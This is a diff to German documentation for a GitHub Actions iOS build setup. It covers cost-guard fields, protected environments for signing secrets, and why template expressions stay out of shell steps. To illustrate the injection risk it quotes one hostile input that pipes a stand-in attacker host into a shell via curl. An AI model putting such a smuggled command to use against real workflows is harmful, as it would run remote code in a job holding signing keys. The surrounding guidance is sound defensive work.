@@ -50,12 +50,19 @@ Konfiguration in `config/projects.json`:
   "repo": "sebastianbuergy-oss/thy-gnosis-ios",
   "workflow": "burgys-ios-build.yml",
   "visibility": "public",
+  "runs_on": "macos-latest",
   "token_file": "C:\\Users\\<user>\\.burgys\\github_token"
 }
 ```
 
-`visibility` ist Pflicht. Fehlt sie, nimmt der Cost Guard `private` an und
-blockiert - lieber ein Build zu wenig als eine Rechnung zu viel.
+`visibility` **und** `runs_on` sind Pflicht:
+
+- Fehlt `visibility`, nimmt der Cost Guard `private` an und blockiert - lieber
+  ein Build zu wenig als eine Rechnung zu viel.
+- Fehlt `runs_on` oder steht das Label nicht auf der Allowlist
+  (`COST_MODEL.md`), blockiert der Cost Guard ebenfalls. Ein Larger Runner
+  kostet auch auf einem oeffentlichen Repository Geld, und ein Label, das
+  Buergys Builds nicht kennt, koennte einer sein.
 
 Das Token gehoert in eine Datei ausserhalb des Repositories und braucht nur
 `actions: write` und `contents: read` auf genau diesem Repo.
@@ -64,16 +71,46 @@ Das Token gehoert in eine Datei ausserhalb des Repositories und braucht nur
 
 1. `burgys-builds/templates/burgys-ios-build.yml` nach
    `.github/workflows/burgys-ios-build.yml` im App-Repo kopieren.
-2. Repository-Secrets setzen: `BURGYS_CERT_P12_BASE64`,
-   `BURGYS_CERT_PASSWORD`, `BURGYS_PROFILE_BASE64`.
-3. Repository-Variablen: `BURGYS_TEAM_ID`, `BURGYS_BUNDLE_ID`.
-4. Ersten Lauf von Hand in der Actions-Oberflaeche starten und zusehen.
-5. Erst danach `executor: "github"` eintragen.
+2. Im App-Repo eine **geschuetzte Umgebung** `ios-signing` anlegen
+   (Settings > Environments) und dort *Required reviewers* auf Sebastian
+   setzen. Der Workflow laeuft mit `environment: ios-signing`.
+3. Die Signing-Secrets **an dieser Umgebung** hinterlegen, nicht am
+   Repository: `BURGYS_CERT_P12_BASE64`, `BURGYS_CERT_PASSWORD`,
+   `BURGYS_PROFILE_BASE64`.
+4. Repository-Variablen: `BURGYS_TEAM_ID`, `BURGYS_BUNDLE_ID`.
+5. Ersten Lauf von Hand in der Actions-Oberflaeche starten und zusehen.
+6. Erst danach `executor: "github"` eintragen.
 
-Zu Punkt 2: ein Distribution-Zertifikat in ein oeffentliches Repo als *Secret*
-zu legen ist ueblich und von GitHub dafuer vorgesehen - Secrets sind in
-Workflow-Runs aus Forks nicht sichtbar und werden in Logs maskiert. Es bleibt
-trotzdem eine Entscheidung, die Sebastian treffen muss, nicht Buergys Builds.
+Warum Punkt 2 und 3 zusammengehoeren: das Repository ist **oeffentlich** und
+der Job kommt an das Distribution-Zertifikat. Secrets an einer geschuetzten
+Umgebung werden erst freigegeben, wenn ein Mensch den Lauf bestaetigt - das ist
+genau die Freigabe aus Abschnitt 29 des Auftrags, nur an der Stelle
+durchgesetzt, an der die Schluessel liegen. Secrets am Repository haetten diese
+Schranke nicht.
+
+Ein Distribution-Zertifikat als GitHub-Secret zu hinterlegen ist ueblich und
+dafuer vorgesehen - Secrets erreichen keine Workflow-Laeufe aus Forks und
+werden in Logs maskiert. Es bleibt trotzdem eine Entscheidung, die Sebastian
+treffen muss, nicht Buergys Builds.
+
+**Das Template und `${{ }}`**
+
+Im Workflow steht kein einziger `${{ ... }}`-Ausdruck in einem `run:`-Block.
+Alles geht ueber `env:` und wird als `"$VARIABLE"` gelesen. Der Grund ist
+nicht Stil: ein Ausdruck wird von GitHub *vor* der Shell ersetzt, also wuerde
+eine Eingabe wie `x"; curl angreifer|sh; #` ausgefuehrt - in einem Job, der das
+Signing-Zertifikat und dessen Passwort in der Hand haelt. Ein erster Schritt
+validiert ausserdem jede Eingabe gegen ein Muster, bevor sie irgendetwas
+anfasst. Wer das Template aendert, muss diese Regel einhalten.
+
+**Export-Methode**
+
+Xcode 15.3 hat `ad-hoc` und `app-store` zugunsten von `release-testing` und
+`app-store-connect` als veraltet markiert. Beide Schreibweisen werden derzeit
+akzeptiert; das Template nutzt die alten und laesst sich ueber
+`BURGYS_EXPORT_METHOD_ADHOC` / `BURGYS_EXPORT_METHOD_STORE` umstellen, ohne
+den Workflow anzufassen. **Beim ersten echten Lauf darauf achten** - wenn
+`xcodebuild -exportArchive` die Methode nicht kennt, ist das die Ursache.
 
 ### `local` - der spaetere Burgys-iOS-Runner
 
